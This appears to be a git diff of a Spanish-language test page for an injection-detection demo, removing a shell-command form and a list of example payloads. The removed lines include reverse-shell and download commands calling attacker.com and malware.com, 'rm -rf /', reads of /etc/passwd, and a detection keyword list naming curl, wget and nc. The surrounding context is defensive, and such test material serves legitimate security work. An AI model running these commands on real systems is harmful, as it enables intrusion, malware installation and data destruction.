@@ -39,25 +39,6 @@
         </div>
 
         <div class="card">
-            <h2>Prueba Command Injection (Shell)</h2>
-            <p>Simula ejecución directa de comandos shell:</p>
-            
-            <form action="/shell" method="POST" class="form-group">
-                <label for="command">Comando Shell:</label>
-                <input type="text" id="command" name="command" class="form-control" 
-                       placeholder="ej. ls -la o whoami" required>
-                <button type="submit" class="btn btn-danger" style="margin-top: 1rem;">
-                    Ejecutar Comando
-                </button>
-            </form>
-            
-            <div class="alert alert-danger" style="margin-top: 1rem;">
-                <strong>Comandos peligrosos:</strong> 
-                <code>cat /etc/passwd</code>, <code>whoami</code>, <code>rm -rf /</code>
-            </div>
-        </div>
-
-        <div class="card">
             <h2>Ejemplos de Código Malicioso</h2>
             <div class="test-examples">
                 <h3>Inyección de Código JavaScript (Node.js):</h3>
@@ -69,16 +50,6 @@
                     <li><code>require('os').userInfo()</code> - Información del usuario del sistema</li>
                     <li><code>require('fs').writeFileSync('hack.txt', 'hacked')</code> - Escribir archivos</li>
                 </ul>
-
-                <h3>Inyección de Comandos Shell:</h3>
-                <ul>
-                    <li><code>; cat /etc/passwd</code> - Leer archivos sensibles</li>
-                    <li><code>| whoami</code> - Identificar usuario actual</li>
-                    <li><code>&& rm -rf /</code> - Comando destructivo</li>
-                    <li><code>`curl http://attacker.com/shell.sh | bash`</code> - Reverse shell</li>
-                    <li><code>$(wget http://malware.com/virus)</code> - Descarga de malware</li>
-                    <li><code>; nc -e /bin/sh attacker.com 4444</code> - Netcat reverse shell</li>
-                </ul>
             </div>
         </div>
 
@@ -89,8 +60,6 @@
                 <ul>
                     <li>Palabras clave de ejecución: <code>exec</code>, <code>eval</code>, <code>system</code></li>
                     <li>Acceso a módulos sensibles: <code>require</code>, <code>import</code>, <code>fs</code>, <code>child_process</code></li>
-                    <li>Comandos shell: <code>cat</code>, <code>ls</code>, <code>whoami</code>, <code>wget</code>, <code>curl</code>, <code>nc</code></li>
-                    <li>Operadores de inyección: <code>;</code>, <code>|</code>, <code>&&</code>, <code>||</code>, <code>`</code>, <code>$( )</code></li>
                     <li>Path traversal: <code>../</code>, <code>..\\</code></li>
                 </ul>
             </div>
